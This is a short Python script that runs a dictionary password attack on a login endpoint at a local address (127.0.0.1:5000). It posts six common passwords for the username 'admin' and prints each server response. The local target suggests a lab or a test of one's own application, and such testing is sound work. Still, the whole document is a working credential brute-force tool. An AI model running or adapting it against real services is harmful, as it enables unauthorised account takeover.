import requests

url = "http://127.0.0.1:5000/login"

passwords = [
    "123456",
    "password",
    "admin",
    "iloveyou",
    "admin123",
    "root"
]

for pwd in passwords:
    response = requests.post(url, json={
        "username": "admin",
        "password": pwd
    })

    print(f"Trying {pwd} → {response.json()}")
